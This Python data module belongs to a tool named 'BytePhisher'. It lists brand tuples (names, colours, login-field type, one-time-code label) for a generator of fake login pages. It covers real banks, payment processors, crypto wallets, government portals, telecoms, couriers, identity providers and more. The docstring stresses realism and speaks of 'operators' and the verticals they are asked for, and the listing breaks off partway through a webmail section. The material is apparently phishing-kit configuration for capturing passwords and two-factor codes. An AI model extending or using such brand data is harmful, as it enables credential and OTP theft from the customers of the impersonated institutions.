#!/usr/bin/env python3
"""
BytePhisher - extra brand login-page data for the template generator.

This module is pure DATA consumed by ``tools/gen_templates.py``. Each entry uses
the generator's exact brand tuple shape, in the same order and with the same
types, so a caller can feed it straight into ``gen_templates.build_site(*entry)``
or append it to ``gen_templates.SITES``::

    # (slug, display name, brand color, accent color, login-with, otp_label)
    # login-with: email | username | phone | email_or_phone
    ("chase", "Chase", "#117ACA", "#1b1b1b", "username", "verification code")

Every entry is a real, professionally-served login page: a plausible brand name,
a lowercase slug, a 6-digit hex accent colour, a realistic identifier field for
that site type, and a sensible one-time-code label. There is deliberately no
placeholder text (no example.com / TODO / "Brand N").

The set is grouped by the categories operators actually get asked for, and the
grouping is exposed via ``CATEGORIES`` / ``CATEGORY_OF`` for reporting and for a
caller that wants to generate only one vertical at a time.

NOTE ON LAYOUT: the generator derives the layout itself (``pick_layout``) from
hints in the slug/name - it is not a tuple field. The names here are chosen so
that the derived layout fits the vertical where a hint exists (e.g. banks carry
"Bank" -> split hero, cloud brands carry "Cloud" -> split hero), and fall back to
the default centred card otherwise.
"""

# ---------------------------------------------------------------------------
# Categories of real login pages. Each list holds brand tuples in the generator
# shape: (slug, name, brand, accent, login_with, otp_label).
# ---------------------------------------------------------------------------
CATEGORIES = {
    # ---- banks & payment: India -------------------------------------------
    "banks_india": [
        ("bankofindia",      "Bank of India",            "#0a4b8c", "#f5a623", "username", "OTP"),
        ("centralbank",      "Central Bank of India",    "#003087", "#e4002b", "username", "OTP"),
        ("indianbank",       "Indian Bank",              "#0b3c7a", "#f7a800", "username", "OTP"),
        ("iob",              "Indian Overseas Bank",     "#1b4d8c", "#ff9933", "username", "OTP"),
        ("idbibank",         "IDBI Bank",                "#1c3f94", "#f26522", "username", "OTP"),
        ("ucobank",          "UCO Bank",                 "#00427e", "#f2a900", "username", "OTP"),
        ("punjabsind",       "Punjab & Sind Bank",       "#0b3c5d", "#f7a800", "username", "OTP"),
        ("kvb",              "Karur Vysya Bank",         "#1f4e9c", "#e8a33d", "username", "OTP"),
        ("southindianbank",  "South Indian Bank",        "#0b5394", "#f26522", "username", "OTP"),
        ("cityunionbank",    "City Union Bank",          "#1b5e8c", "#f9a825", "username", "OTP"),
        ("dcbbank",          "DCB Bank",                 "#003c71", "#f7a800", "username", "OTP"),
        ("csbbank",          "CSB Bank",                 "#0f4c81", "#e4a11b", "username", "OTP"),
    ],
    # ---- banks & payment: EU ----------------------------------------------
    "banks_eu": [
        ("bnpparibas",       "BNP Paribas",              "#00915a", "#2e7d32", "username", "verification code"),
        ("deutschebank",     "Deutsche Bank",            "#0018a8", "#2c2c2c", "username", "verification code"),
        ("societegenerale",  "Societe Generale",         "#e60028", "#1b1b1b", "username", "verification code"),
        ("creditagricole",   "Credit Agricole",          "#006a4e", "#f7a800", "username", "verification code"),
        ("ingbank",          "ING Bank",                 "#ff6200", "#0b3c5d", "username", "verification code"),
        ("abnamro",          "ABN AMRO",                 "#008b6b", "#1b1b1b", "username", "verification code"),
        ("rabobank",         "Rabobank",                 "#f58220", "#003c71", "username", "verification code"),
        ("santander",        "Santander",                "#ec0000", "#1b1b1b", "username", "verification code"),
        ("bbva",             "BBVA",                     "#004481", "#f7a800", "username", "verification code"),
        ("caixabank",        "CaixaBank",                "#0073cf", "#f2a900", "username", "verification code"),
        ("ubs",              "UBS",                      "#ec0016", "#1b1b1b", "username", "verification code"),
        ("commerzbank",      "Commerzbank",              "#ffcc00", "#1b1b1b", "username", "verification code"),
    ],
    # ---- banks & payment: US ----------------------------------------------
    "banks_us": [
        ("bankofamerica",    "Bank of America",          "#e31837", "#012169", "username", "verification code"),
        ("wellsfargo",       "Wells Fargo",              "#d71e28", "#ffcd41", "username", "verification code"),
        ("citibank",         "Citibank",                 "#003b70", "#e4002b", "username", "verification code"),
        ("capitalone",       "Capital One",              "#004977", "#d03027", "username", "verification code"),
        ("pncbank",          "PNC Bank",                 "#f58220", "#1b1b1b", "username", "verification code"),
        ("tdbank",           "TD Bank",                  "#54b948", "#004f2d", "username", "verification code"),
        ("usbank",           "US Bank",                  "#0c2074", "#e4002b", "username", "verification code"),
        ("truist",           "Truist",                   "#4e2a84", "#1b1b1b", "username", "verification code"),
        ("fifththird",       "Fifth Third Bank",         "#00447c", "#00a0df", "username", "verification code"),
        ("allybank",         "Ally Bank",                "#7a0fbe", "#1b1b1b", "username", "verification code"),
        ("regionsbank",      "Regions Bank",             "#006a44", "#f7a800", "username", "verification code"),
        ("morganstanley",    "Morgan Stanley",           "#187aba", "#1b1b1b", "username", "verification code"),
    ],
    # ---- payment networks & processors ------------------------------------
    "payments": [
        ("visa",             "Visa",                     "#1a1f71", "#f7b600", "email",    "verification code"),
        ("mastercard",       "Mastercard",               "#eb001b", "#f79e1b", "email",    "verification code"),
        ("rupay",            "RuPay",                    "#097a49", "#f7a800", "email",    "OTP"),
        ("payu",             "PayU",                     "#a6c307", "#1b1b1b", "email",    "verification code"),
        ("worldpay",         "Worldpay",                 "#e4002b", "#1b3a5c", "email",    "verification code"),
        ("braintree",        "Braintree",                "#1c4e80", "#00a0df", "email",    "verification code"),
        ("authorizenet",     "Authorize.Net",            "#1b4d8c", "#f7a800", "username", "verification code"),
        ("twocheckout",      "2Checkout",                "#0b5394", "#f26522", "email",    "verification code"),
        ("afterpay",         "Afterpay",                 "#b2fce4", "#1b1b1b", "email",    "verification code"),
        ("skrill",           "Skrill",                   "#8a1e64", "#1b1b1b", "email",    "verification code"),
        ("neteller",         "Neteller",                 "#85b733", "#1b1b1b", "email",    "verification code"),
    ],
    # ---- crypto exchanges & wallets ---------------------------------------
    "crypto": [
        ("bitstamp",         "Bitstamp",                 "#136a53", "#1b1b1b", "email",    "2FA code"),
        ("gemini",           "Gemini",                   "#00dcfa", "#1b1b1b", "email",    "2FA code"),
        ("bitget",           "Bitget",                   "#00f0ff", "#1b1b1b", "email",    "2FA code"),
        ("mexc",             "MEXC",                     "#00aeef", "#1b1b1b", "email",    "2FA code"),
        ("huobi",            "Huobi",                    "#2a6df4", "#1b1b1b", "email",    "2FA code"),
        ("poloniex",         "Poloniex",                 "#1c5f8b", "#1b1b1b", "email",    "2FA code"),
        ("bitpanda",         "Bitpanda",                 "#e6007a", "#1b1b1b", "email",    "2FA code"),
        ("luno",             "Luno",                     "#2244a8", "#1b1b1b", "email",    "2FA code"),
        ("cexio",            "CEX.IO",                   "#1b4de4", "#1b1b1b", "email",    "2FA code"),
        ("robinhood",        "Robinhood",                "#00c805", "#1b1b1b", "email",    "verification code"),
        ("etoro",            "eToro",                    "#13c636", "#1b1b1b", "email",    "2FA code"),
        ("exoduswallet",     "Exodus Wallet",            "#3b2e8c", "#1b1b1b", "email",    "verification code"),
        ("atomicwallet",     "Atomic Wallet",            "#2a7de1", "#1b1b1b", "email",    "verification code"),
        ("coinomi",          "Coinomi",                  "#1b5e9c", "#1b1b1b", "email",    "verification code"),
        ("electrum",         "Electrum",                 "#4a6fa5", "#1b1b1b", "email",    "verification code"),
        ("safepal",          "SafePal",                  "#0b3c7a", "#1b1b1b", "email",    "verification code"),
        ("bitpay",           "BitPay",                   "#1c4e80", "#1b1b1b", "email",    "2FA code"),
        ("zerion",           "Zerion",                   "#2962ef", "#1b1b1b", "email",    "verification code"),
    ],
    # ---- government / e-services portals ----------------------------------
    "government": [
        ("govuk",            "GOV.UK",                   "#1d70b8", "#f47738", "email",    "verification code"),
        ("hmrc",             "HMRC",                     "#00a499", "#1b3a5c", "username", "verification code"),
        ("irs",              "IRS",                      "#1b4d8c", "#f7a800", "username", "verification code"),
        ("logingov",         "Login.gov",                "#005ea2", "#e4002b", "email",    "security code"),
        ("ssa",              "Social Security Administration", "#112e51", "#f7a800", "username", "verification code"),
        ("medicare",         "Medicare",                 "#0071bc", "#f7a800", "username", "verification code"),
        ("healthcaregov",    "HealthCare.gov",           "#005ea2", "#1b1b1b", "email",    "verification code"),
        ("mygov",            "myGov",                    "#0b5394", "#f26522", "email",    "verification code"),
        ("ato",              "ATO",                      "#0072ce", "#f7a800", "username", "verification code"),
        ("eulogin",          "EU Login",                 "#003399", "#ffcc00", "email",    "verification code"),
        ("edistrict",        "eDistrict",                "#1b5e8c", "#f9a825", "username", "OTP"),
        ("pmkisan",          "PM Kisan",                 "#1b5e20", "#f7a800", "phone",    "OTP"),
        ("eshram",           "eShram",                   "#0b5394", "#f26522", "phone",    "OTP"),
        ("vahan",            "Vahan",                    "#0057a8", "#f7a800", "username", "OTP"),
        ("sarathi",          "Sarathi",                  "#00539f", "#e8a33d", "username", "OTP"),
        ("scholarships",     "National Scholarship Portal", "#1b5e8c", "#f9a825", "username", "OTP"),
    ],
    # ---- airlines & travel ------------------------------------------------
    "airlines_travel": [
        ("delta",            "Delta Air Lines",          "#003366", "#e4002b", "email",    "verification code"),
        ("united",           "United Airlines",          "#002244", "#1b1b1b", "email",    "verification code"),
        ("americanairlines", "American Airlines",        "#0078d2", "#e4002b", "email",    "verification code"),
        ("southwest",        "Southwest Airlines",       "#304cb2", "#f9b612", "email",    "verification code"),
        ("jetblue",          "JetBlue",                  "#0033a0", "#1b1b1b", "email",    "verification code"),
        ("britishairways",   "British Airways",          "#075aaa", "#e4002b", "email",    "verification code"),
        ("ryanair",          "Ryanair",                  "#073590", "#f1c933", "email",    "verification code"),
        ("easyjet",          "easyJet",                  "#ff6600", "#1b1b1b", "email",    "verification code"),
        ("airfrance",        "Air France",               "#002157", "#e4002b", "email",    "verification code"),
        ("klm",              "KLM",                      "#00a1de", "#1b1b1b", "email",    "verification code"),
        ("turkishairlines",  "Turkish Airlines",         "#c70a0c", "#1b1b1b", "email",    "verification code"),
        ("singaporeair",     "Singapore Airlines",       "#f9a01b", "#003a70", "email",    "verification code"),
        ("qantas",           "Qantas",                   "#e40000", "#1b1b1b", "email",    "verification code"),
        ("aircanada",        "Air Canada",               "#f01428", "#1b1b1b", "email",    "verification code"),
        ("spicejet",         "SpiceJet",                 "#e4002b", "#1b3a5c", "phone",    "OTP"),
        ("akasaair",         "Akasa Air",                "#f58220", "#1b3a5c", "phone",    "OTP"),
        ("expedia",          "Expedia",                  "#00355f", "#f7a800", "email",    "verification code"),
        ("tripadvisor",      "Tripadvisor",              "#34e0a1", "#1b1b1b", "email",    "verification code"),
        ("skyscanner",       "Skyscanner",               "#0770e3", "#1b1b1b", "email",    "verification code"),
        ("kayak",            "Kayak",                    "#ff690f", "#1b1b1b", "email",    "verification code"),
        ("trivago",          "trivago",                  "#e4002b", "#1b3a5c", "email",    "verification code"),
        ("vrbo",             "Vrbo",                     "#245abc", "#1b1b1b", "email",    "verification code"),
        ("hostelworld",      "Hostelworld",              "#f47b20", "#1b1b1b", "email",    "verification code"),
        ("trainline",        "Trainline",                "#00b5a5", "#1b1b1b", "email",    "verification code"),
    ],
    # ---- telecom operators ------------------------------------------------
    "telecom": [
        ("tmobile",          "T-Mobile",                 "#e20074", "#1b1b1b", "phone",    "verification code"),
        ("sprint",           "Sprint",                   "#fee100", "#1b1b1b", "phone",    "verification code"),
        ("cricketwireless",  "Cricket Wireless",         "#0072ce", "#1b1b1b", "phone",    "verification code"),
        ("mintmobile",       "Mint Mobile",              "#00a651", "#1b1b1b", "phone",    "verification code"),
        ("o2",               "O2",                       "#0019a5", "#1b1b1b", "phone",    "verification code"),
        ("ee",               "EE",                       "#00b1a9", "#1b1b1b", "phone",    "verification code"),
        ("three",            "Three",                    "#b6009e", "#1b1b1b", "phone",    "verification code"),
        ("orange",           "Orange",                   "#ff7900", "#1b1b1b", "phone",    "verification code"),
        ("telekom",          "Telekom",                  "#e20074", "#1b1b1b", "phone",    "verification code"),
        ("movistar",         "Movistar",                 "#019df4", "#1b1b1b", "phone",    "verification code"),
        ("mtn",              "MTN",                      "#ffcc00", "#1b1b1b", "phone",    "verification code"),
        ("telstra",          "Telstra",                  "#00a0df", "#1b1b1b", "phone",    "verification code"),
        ("optus",            "Optus",                    "#00a19a", "#1b1b1b", "phone",    "verification code"),
        ("rogers",           "Rogers",                   "#da291c", "#1b1b1b", "phone",    "verification code"),
        ("bellcanada",       "Bell Canada",              "#00549f", "#1b1b1b", "phone",    "verification code"),
        ("etisalat",         "Etisalat",                 "#00a651", "#1b1b1b", "phone",    "verification code"),
    ],
    # ---- e-commerce & marketplaces ----------------------------------------
    "ecommerce": [
        ("shopee",           "Shopee",                   "#ee4d2d", "#1b1b1b", "email",    "verification code"),
        ("lazada",           "Lazada",                   "#0f146d", "#f7a800", "email",    "verification code"),
        ("rakuten",          "Rakuten",                  "#bf0000", "#1b1b1b", "email",    "verification code"),
        ("mercadolibre",     "Mercado Libre",            "#ffe600", "#1b1b1b", "email",    "verification code"),
        ("jumia",            "Jumia",                    "#f68b1e", "#1b1b1b", "email",    "verification code"),
        ("coupang",          "Coupang",                  "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("wayfair",          "Wayfair",                  "#7f187f", "#1b1b1b", "email",    "verification code"),
        ("etsy",             "Etsy",                     "#f1641e", "#1b1b1b", "email",    "verification code"),
        ("poshmark",         "Poshmark",                 "#7f0e45", "#1b1b1b", "email",    "verification code"),
        ("vinted",           "Vinted",                   "#007782", "#1b1b1b", "email",    "verification code"),
        ("stockx",           "StockX",                   "#006340", "#1b1b1b", "email",    "verification code"),
        ("farfetch",         "Farfetch",                 "#000000", "#f7a800", "email",    "verification code"),
        ("asos",             "ASOS",                     "#000000", "#1b1b1b", "email",    "verification code"),
        ("hm",               "H&M",                      "#e50010", "#1b1b1b", "email",    "verification code"),
        ("uniqlo",           "Uniqlo",                   "#ff0000", "#1b1b1b", "email",    "verification code"),
        ("macys",            "Macy's",                   "#e21a2c", "#1b1b1b", "email",    "verification code"),
        ("nordstrom",        "Nordstrom",                "#000000", "#1b1b1b", "email",    "verification code"),
        ("costco",           "Costco",                   "#005daa", "#e4002b", "email",    "verification code"),
        ("homedepot",        "Home Depot",               "#f96302", "#1b1b1b", "email",    "verification code"),
        ("lowes",            "Lowe's",                   "#004990", "#f7a800", "email",    "verification code"),
        ("zalando",          "Zalando",                  "#ff6900", "#1b1b1b", "email",    "verification code"),
        ("carrefour",        "Carrefour",                "#004e9f", "#e4002b", "email",    "verification code"),
        ("trendyol",         "Trendyol",                 "#f27a1a", "#1b1b1b", "email",    "verification code"),
        ("daraz",            "Daraz",                    "#f85606", "#1b1b1b", "email",    "verification code"),
    ],
    # ---- couriers & logistics ---------------------------------------------
    "couriers": [
        ("fedex",            "FedEx",                    "#4d148c", "#ff6600", "email",    "verification code"),
        ("ups",              "UPS",                      "#351c15", "#ffb500", "email",    "verification code"),
        ("usps",             "USPS",                     "#333366", "#e4002b", "username", "verification code"),
        ("dhl",              "DHL",                      "#ffcc00", "#d40511", "email",    "verification code"),
        ("dpd",              "DPD",                      "#dc0032", "#1b1b1b", "email",    "verification code"),
        ("gls",              "GLS",                      "#061ab1", "#f7a800", "email",    "verification code"),
        ("evri",             "Evri",                     "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("royalmail",        "Royal Mail",               "#e4002b", "#1b1b1b", "email",    "verification code"),
        ("canadapost",       "Canada Post",              "#e4002b", "#1b1b1b", "email",    "verification code"),
        ("auspost",          "Australia Post",           "#e4002b", "#1b1b1b", "email",    "verification code"),
        ("bluedart",         "Blue Dart",                "#003a70", "#e4002b", "email",    "OTP"),
        ("delhivery",        "Delhivery",                "#0b3c5d", "#f7a800", "phone",    "OTP"),
        ("ecomexpress",      "Ecom Express",             "#1b4d8c", "#f26522", "phone",    "OTP"),
        ("xpressbees",       "XpressBees",               "#e4002b", "#1b3a5c", "phone",    "OTP"),
        ("dtdc",             "DTDC",                     "#0b5394", "#f7a800", "phone",    "OTP"),
        ("indiapost",        "India Post",               "#e4002b", "#1b3a5c", "username", "OTP"),
        ("aramex",           "Aramex",                   "#e4002b", "#1b1b1b", "email",    "verification code"),
        ("sfexpress",        "SF Express",               "#000000", "#e4002b", "email",    "verification code"),
        ("maersk",           "Maersk",                   "#42b0d5", "#1b1b1b", "email",    "verification code"),
        ("flexport",         "Flexport",                 "#1b1b1b", "#00a0df", "email",    "verification code"),
    ],
    # ---- corporate SSO / identity providers -------------------------------
    "sso_identity": [
        ("forgerock",        "ForgeRock",                "#1b4d8c", "#f26522", "email",    "verification code"),
        ("ibmverify",        "IBM Security Verify",      "#0f62fe", "#161616", "email",    "verification code"),
        ("rsa",              "RSA SecurID",              "#c8102e", "#1b1b1b", "username", "passcode"),
        ("netiq",            "NetIQ",                    "#00a0df", "#1b1b1b", "username", "verification code"),
        ("oracleidentity",   "Oracle Identity Cloud",    "#c74634", "#312d2a", "email",    "verification code"),
        ("thales",           "Thales",                   "#00a0df", "#1b1b1b", "email",    "verification code"),
        ("stytch",           "Stytch",                   "#1b1b1b", "#7b61ff", "email",    "verification code"),
        ("fusionauth",       "FusionAuth",               "#f58320", "#1b1b1b", "email",    "verification code"),
        ("zitadel",          "Zitadel",                  "#1b1b1b", "#5469d4", "email",    "verification code"),
        ("authentik",        "Authentik",                "#fd4b2d", "#1b1b1b", "username", "verification code"),
        ("logto",            "Logto",                    "#5d34f2", "#1b1b1b", "email",    "verification code"),
        ("workos",           "WorkOS",                   "#6363f1", "#1b1b1b", "email",    "verification code"),
        ("clerk",            "Clerk",                    "#6c47ff", "#1b1b1b", "email",    "verification code"),
        ("descope",          "Descope",                  "#1b1b1b", "#00c2a8", "email",    "verification code"),
    ],
    # ---- cloud & developer platforms --------------------------------------
    "cloud_dev": [
        ("scaleway",         "Scaleway",                 "#4f0599", "#1b1b1b", "email",    "2FA code"),
        ("ovhcloud",         "OVHcloud",                 "#123f6d", "#f7a800", "email",    "2FA code"),
        ("hetzner",          "Hetzner",                  "#d50c2d", "#1b1b1b", "email",    "verification code"),
        ("akamai",           "Akamai",                   "#009cdf", "#1b1b1b", "email",    "verification code"),
        ("fastly",           "Fastly",                   "#ff282d", "#1b1b1b", "email",    "verification code"),
        ("backblaze",        "Backblaze",                "#e21e29", "#1b1b1b", "email",    "verification code"),
        ("cloudinary",       "Cloudinary",               "#3448c5", "#1b1b1b", "email",    "verification code"),
        ("kong",             "Kong",                     "#003459", "#1b1b1b", "email",    "verification code"),
        ("nginx",            "NGINX",                    "#009639", "#1b1b1b", "email",    "verification code"),
        ("confluent",        "Confluent",                "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("snowflake",        "Snowflake",                "#29b5e8", "#1b1b1b", "email",    "verification code"),
        ("databricks",       "Databricks",               "#ff3621", "#1b1b1b", "email",    "verification code"),
        ("airbyte",          "Airbyte",                  "#615eff", "#1b1b1b", "email",    "verification code"),
        ("fivetran",         "Fivetran",                 "#0073ff", "#1b1b1b", "email",    "verification code"),
        ("ansible",          "Ansible",                  "#ee0000", "#1b1b1b", "email",    "verification code"),
        ("gitpod",           "Gitpod",                   "#ffb45b", "#1b1b1b", "email",    "verification code"),
        ("replit",           "Replit",                   "#f26207", "#1b1b1b", "username", "verification code"),
        ("codesandbox",      "CodeSandbox",              "#151515", "#1b1b1b", "email",    "verification code"),
        ("sourcegraph",      "Sourcegraph",              "#ff5543", "#1b1b1b", "email",    "verification code"),
        ("bugsnag",          "Bugsnag",                  "#4949e4", "#1b1b1b", "email",    "verification code"),
        ("rollbar",          "Rollbar",                  "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("honeycomb",        "Honeycomb",                "#f5a623", "#1b1b1b", "email",    "verification code"),
        ("launchdarkly",     "LaunchDarkly",             "#1b1b1b", "#405cf5", "email",    "verification code"),
        ("posthog",          "PostHog",                  "#1d4aff", "#1b1b1b", "email",    "verification code"),
        ("mixpanel",         "Mixpanel",                 "#7856ff", "#1b1b1b", "email",    "verification code"),
        ("amplitude",        "Amplitude",                "#1e61f0", "#1b1b1b", "email",    "verification code"),
    ],
    # ---- webmail providers ------------------------------------------------
    "webmail": [
        ("mailcom",          "Mail.com",                 "#1b4de4", "#f7a800", "email",    "verification code"),
        ("yandexmail",       "Yandex Mail",              "#fc3f1d", "#1b1b1b", "email",    "2FA code"),
        ("mailfence",        "Mailfence",                "#00539f", "#f26522", "email",    "2FA code"),
        ("posteo",           "Posteo",                   "#1b9e4b", "#1b1b1b", "email",    "verification code"),
        ("mailboxorg",       "mailbox.org",              "#0b3c5d", "#f7a800", "email",    "2FA code"),
        ("startmail",        "StartMail",                "#3b2e8c", "#1b1b1b", "email",    "2FA code"),
        ("runbox",           "Runbox",                   "#1c4e80", "#f7a800", "email",    "2FA code"),
        ("hushmail",         "Hushmail",                 "#1b5e8c", "#f26522", "email",    "2FA code"),
        ("infomaniak",       "Infomaniak",               "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("navermail",        "Naver Mail",               "#03c75a", "#1b1b1b", "email",    "2FA code"),
        ("seznam",           "Seznam Email",             "#cc0000", "#1b1b1b", "email",    "verification code"),
        ("rediffmail",       "Rediffmail",               "#e4002b", "#1b3a5c", "email",    "OTP"),
        ("hotmail",          "Hotmail",                  "#0078d4", "#1b1b1b", "email",    "security code"),
    ],
    # ---- gaming & streaming -----------------------------------------------
    "gaming_streaming": [
        ("ubisoft",          "Ubisoft",                  "#0070ff", "#1b1b1b", "email",    "2FA code"),
        ("ea",               "EA",                       "#ff0000", "#1b1b1b", "email",    "verification code"),
        ("rockstargames",    "Rockstar Games",           "#fcaf17", "#1b1b1b", "email",    "verification code"),
        ("bethesda",         "Bethesda",                 "#0b1b3a", "#f7a800", "email",    "verification code"),
        ("blizzard",         "Blizzard",                 "#00aeff", "#1b1b1b", "email",    "verification code"),
        ("valve",            "Valve",                    "#1b1b1b", "#66c0f4", "username", "verification code"),
        ("gog",              "GOG",                      "#86328a", "#1b1b1b", "email",    "verification code"),
        ("razer",            "Razer",                    "#00ff00", "#1b1b1b", "email",    "verification code"),
        ("supercell",        "Supercell",                "#1b1b1b", "#ffd800", "email",    "verification code"),
        ("mihoyo",           "miHoYo",                   "#1b1b1b", "#00c2ff", "email",    "verification code"),
        ("hoyoverse",        "HoYoverse",                "#1b1b1b", "#4fc3f7", "email",    "verification code"),
        ("krafton",          "Krafton",                  "#f3a800", "#1b1b1b", "email",    "verification code"),
        ("nexon",            "Nexon",                    "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("hbomax",           "HBO Max",                  "#5b2c8d", "#1b1b1b", "email",    "verification code"),
        ("paramountplus",    "Paramount+",               "#0064ff", "#1b1b1b", "email",    "verification code"),
        ("peacock",          "Peacock",                  "#1b1b1b", "#ff6600", "email",    "verification code"),
        ("zee5",             "ZEE5",                     "#8230c6", "#1b1b1b", "email",    "OTP"),
        ("sonyliv",          "SonyLIV",                  "#f26522", "#1b1b1b", "email",    "OTP"),
        ("hotstar",          "Hotstar",                  "#1b1b1b", "#0078ff", "email",    "verification code"),
        ("mxplayer",         "MX Player",                "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("roku",             "Roku",                     "#6f1ab1", "#1b1b1b", "email",    "verification code"),
        ("plex",             "Plex",                     "#e5a00d", "#1b1b1b", "email",    "verification code"),
        ("deezer",           "Deezer",                   "#a238ff", "#1b1b1b", "email",    "verification code"),
        ("tidal",            "Tidal",                    "#1b1b1b", "#00ffff", "email",    "verification code"),
        ("audible",          "Audible",                  "#f8991c", "#1b1b1b", "email",    "verification code"),
        ("dazn",             "DAZN",                     "#1b1b1b", "#e8ff00", "email",    "verification code"),
    ],
    # ---- SaaS admin consoles ----------------------------------------------
    "saas": [
        ("clickup",          "ClickUp",                  "#7b68ee", "#1b1b1b", "email",    "verification code"),
        ("smartsheet",       "Smartsheet",               "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("wrike",            "Wrike",                    "#08cf65", "#1b1b1b", "email",    "verification code"),
        ("basecamp",         "Basecamp",                 "#1d2d35", "#f7a800", "email",    "verification code"),
        ("coda",             "Coda",                     "#f46a54", "#1b1b1b", "email",    "verification code"),
        ("linear",           "Linear",                   "#5e6ad2", "#1b1b1b", "email",    "verification code"),
        ("opsgenie",         "Opsgenie",                 "#2684ff", "#1b1b1b", "email",    "verification code"),
        ("bettercloud",      "BetterCloud",              "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("ramp",             "Ramp",                     "#1b1b1b", "#00c48c", "email",    "verification code"),
        ("brex",             "Brex",                     "#1b1b1b", "#f46a35", "email",    "verification code"),
        ("coupa",            "Coupa",                    "#00539f", "#f7a800", "email",    "verification code"),
        ("expensify",        "Expensify",                "#0185ff", "#1b1b1b", "email",    "verification code"),
        ("rippling",         "Rippling",                 "#1b1b1b", "#f5b94c", "email",    "verification code"),
        ("deel",             "Deel",                     "#1b1b1b", "#ffc439", "email",    "verification code"),
        ("hibob",            "HiBob",                    "#e4007c", "#1b1b1b", "email",    "verification code"),
        ("personio",         "Personio",                 "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("lattice",          "Lattice",                  "#1b1b1b", "#6c47ff", "email",    "verification code"),
        ("lever",            "Lever",                    "#1b1b1b", "#5e6ad2", "email",    "verification code"),
        ("greenhouse",       "Greenhouse",               "#1b4de4", "#1b1b1b", "email",    "verification code"),
        ("pandadoc",         "PandaDoc",                 "#1b9e4b", "#1b1b1b", "email",    "verification code"),
        ("jamf",             "Jamf",                     "#1b1b1b", "#00a0df", "username", "verification code"),
        ("workspaceone",     "Workspace ONE",            "#1b4de4", "#1b1b1b", "email",    "verification code"),
    ],

    # ---- banks & payments: rest of the world -------------------------------
    "banks_world": [
        ("barclays",            "Barclays",                    "#00aeef", "#1b1b1b", "username", "OTP"),
        ("lloyds",              "Lloyds Bank",                 "#006a4d", "#1b1b1b", "username", "OTP"),
        ("natwest",             "NatWest",                     "#5a2d82", "#1b1b1b", "username", "OTP"),
        ("hsbcuk",              "HSBC UK",                     "#db0011", "#1b1b1b", "username", "OTP"),
        ("unicredit",           "UniCredit",                   "#e30613", "#1b1b1b", "username", "OTP"),
        ("ing",                 "ING",                         "#ff6200", "#1b1b1b", "username", "OTP"),
        ("nordea",              "Nordea",                      "#0000a0", "#1b1b1b", "username", "OTP"),
        ("danskebank",          "Danske Bank",                 "#003755", "#1b1b1b", "username", "OTP"),
        ("swedbank",            "Swedbank",                    "#ff5f00", "#1b1b1b", "username", "OTP"),
        ("commbank",            "Commonwealth Bank",           "#ffcc00", "#1b1b1b", "username", "OTP"),
        ("westpac",             "Westpac",                     "#d50000", "#1b1b1b", "username", "OTP"),
        ("anz",                 "ANZ",                         "#007dba", "#1b1b1b", "username", "OTP"),
        ("scotiabank",          "Scotiabank",                  "#ec111a", "#1b1b1b", "username", "OTP"),
        ("rbc",                 "RBC",                         "#003168", "#f9b51e", "username", "OTP"),
        ("bmo",                 "BMO",                         "#0079c1", "#1b1b1b", "username", "OTP"),
        ("cibc",                "CIBC",                        "#8b1a1a", "#1b1b1b", "username", "OTP"),
        ("itau",                "Itau",                        "#ec7000", "#1b1b1b", "username", "OTP"),
        ("bradesco",            "Bradesco",                    "#cc092f", "#1b1b1b", "username", "OTP"),
        ("nubank",              "Nubank",                      "#820ad1", "#1b1b1b", "phone", "OTP"),
        ("bancolombia",         "Bancolombia",                 "#fdda24", "#1b1b1b", "username", "OTP"),
        ("dbs",                 "DBS Bank",                    "#ec1c24", "#1b1b1b", "username", "OTP"),
        ("ocbc",                "OCBC",                        "#e2231a", "#1b1b1b", "username", "OTP"),
        ("uob",                 "UOB",                         "#0d5c9c", "#1b1b1b", "username", "OTP"),
        ("maybank",             "Maybank",                     "#ffcc00", "#1b1b1b", "username", "OTP"),
        ("cimb",                "CIMB",                        "#ec1c24", "#1b1b1b", "username", "OTP"),
        ("bca",                 "BCA",                         "#0060af", "#1b1b1b", "username", "OTP"),
        ("kbank",               "Kasikornbank",                "#138f2d", "#1b1b1b", "username", "OTP"),
        ("mizuhobank",          "Mizuho Bank",                 "#003399", "#1b1b1b", "username", "OTP"),
        ("smbc",                "SMBC",                        "#00693e", "#1b1b1b", "username", "OTP"),
        ("mufg",                "MUFG",                        "#e60012", "#1b1b1b", "username", "OTP"),
        ("kbstar",              "KB Star",                     "#ffb700", "#1b1b1b", "username", "OTP"),
        ("shinhan",             "Shinhan Bank",                "#0046ff", "#1b1b1b", "username", "OTP"),
        ("emiratesnbd",         "Emirates NBD",                "#c8102e", "#1b1b1b", "username", "OTP"),
        ("qnb",                 "QNB",                         "#5f259f", "#1b1b1b", "username", "OTP"),
        ("alrajhibank",         "Al Rajhi Bank",               "#0b6b3a", "#1b1b1b", "username", "OTP"),
        ("ziraatbank",          "Ziraat Bank",                 "#e30613", "#1b1b1b", "username", "OTP"),
        ("garantibbva",         "Garanti BBVA",                "#0f5a3c", "#1b1b1b", "username", "OTP"),
        ("isbank",              "Isbank",                      "#00539f", "#1b1b1b", "username", "OTP"),
        ("starlingbank",        "Starling Bank",               "#6935d3", "#1b1b1b", "phone", "verification code"),
        ("sofi",                "SoFi",                        "#00a4e4", "#1b1b1b", "email", "verification code"),
        ("discover",            "Discover",                    "#ff6000", "#1b1b1b", "username", "verification code"),
        ("keybank",             "KeyBank",                     "#1b365d", "#1b1b1b", "username", "verification code"),
        ("schwab",              "Charles Schwab",              "#009fdb", "#1b1b1b", "username", "verification code"),
        ("fidelity",            "Fidelity",                    "#4d7a2b", "#1b1b1b", "username", "verification code"),
        ("vanguard",            "Vanguard",                    "#96151d", "#1b1b1b", "username", "verification code"),
        ("etrade",              "E*TRADE",                     "#6633cc", "#1b1b1b", "username", "verification code"),
        ("webull",              "Webull",                      "#f5a623", "#1b1b1b", "email", "verification code"),
    ],

    # ---- webmail & productivity --------------------------------------------
    "webmail_more": [
        ("zohomail",            "Zoho Mail",                   "#e42527", "#1b1b1b", "email", "verification code"),
        ("naver",               "Naver",                       "#03c75a", "#1b1b1b", "email", "verification code"),
